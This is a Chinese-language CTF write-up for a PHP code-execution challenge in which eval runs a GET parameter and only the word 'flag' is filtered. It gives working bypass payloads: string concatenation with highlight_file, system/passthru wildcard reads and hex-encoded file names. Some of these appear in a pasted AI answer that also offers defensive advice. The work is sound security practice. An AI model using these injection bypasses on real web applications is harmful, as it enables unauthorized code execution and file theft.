题目提示`命令执行，需要严格的过滤`，估计有什么接口没做过滤就直接执行用户输入的命令了
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:26:48
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

由于存在 preg_match 不区分大小写（/i）匹配 flag，命令中不能直接出现 `flag` 否则不会被执行，使用拼接的方式可以不直接出现可被匹配的 `flag` 四个连续字母但达到相同的效果

```
$a='fla'; $b='g.php'; highlight_file($a.$b);
```

经过浏览器自动 URL 编码后是这样的
```
/?c=$a=%27fla%27;%20$b=%27g.php%27;%20highlight_file($a.$b);
```

或者去掉空格会更简单一点，%27应该就是单引号
```
/?c=$a=%27fla%27;$b=%27g.php%27;highlight_file($a.$b);
```

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:14:07
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:14:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag = 'ctfshow{b174ee85-c133-46b9-997d-934a41fa5581}';
```

下面是 Gemini 3.8 Flash 给出的回答，我测试了前三个绕过都没有成功，第四个成功了所以放在上面

**不会直接显示**。

`eval()` 在 PHP 中只是把传入的字符串当作 PHP 代码来**解析并执行**，它本身**不会**自动将表达式的结果打印或输出到页面上。

---

**两种场景的对比**

* **不会显示输出：**
如果传入的代码仅有计算或读取操作，没有显式输出函数，页面上什么都不会显示。
```php
$c = "1 + 1;";
$c = "file_get_contents('flag.php');";
$c = "system('ls');"; // 注意：反引号或部分只读函数若无 echo 也可能不直接回显

```


上述代码会被正常执行，但返回值只停留在内存中，不会输出。
* **会显示输出：**
只有当传入的代码**本身自带输出语句**时，结果才会显示：
```php
$c = "echo 1 + 1;";
$c = "print_r(scandir('.'));";
$c = "highlight_file('index.php');";
$c = "passthru('cat fl*');"; // passthru 会直接把命令执行结果打印到标准输出

```



---

**CTF / 代码执行常见绕过技巧**

在 CTF 题目中遇到这种过滤 `flag` 的 `eval($c)` 时，通常需要主动构造**带输出的函数**并**绕过 `flag` 关键字**：

* **主动输出内容：** 使用 `echo`、`print_r`、`var_dump`、`highlight_file` 或 `readfile`。
* **绕过 `flag` 过滤：**
* 字符串拼接：`echo file_get_contents('fla'.'g.php');`
* 通配符读取：`system('cat fla*');`
* 进制/编码转换：`readfile(hex2bin('666c61672e706870'));` （十六进制对应 `flag.php`）
* 变量覆盖/外部传参：`$a='fla'; $b='g.php'; highlight_file($a.$b);`

---

出现前三种失败而第四种成功的情况，通常是由目标环境的具体限制引起的：

* **系统命令执行被禁用（`disable_functions`）**：
很多题目环境在 `php.ini` 中通过 `disable_functions` 禁用了 `system`、`exec`、`passthru`、`shell_exec` 等函数。因此基于系统命令或通配符（如 `cat fla*`）的方法会直接失效。
* **文件读取与代码高亮差异**：
若目标文件内容被包裹在 PHP 标签中（例如 `<?php $flag = "..."; ?>`），使用 `file_get_contents` 或 `readfile` 直接输出时，浏览器可能会将其视作 HTML 标签而不予渲染（在源码中可能可见，但在页面表面为空白）。
* **第四种生效的原因**：
`highlight_file`（或 `show_source`）会解析并格式化输出 PHP 源码，同时通过变量拆分（如 `$a='fla'; $b='g.php';`）拼接绕过了对字符串 `flag` 的正则匹配。

---

**防御与修复建议**

这种模式的根本风险在于信任了不受控的外部输入并传入了危险执行函数：

* **禁用 `eval**`：`eval` 是一个语言构造器而非普通函数，无法通过 `disable_functions` 简单禁用。在生产代码中应完全避免使用 `eval` 解析用户数据。
* **白名单替代正则黑名单**：基于关键词（如 `flag`）的黑名单过滤极易被字符串拼接、编码转换或变量引用等方式绕过。涉及动态调用时，应使用严格的白名单机制限制允许执行的操作或参数。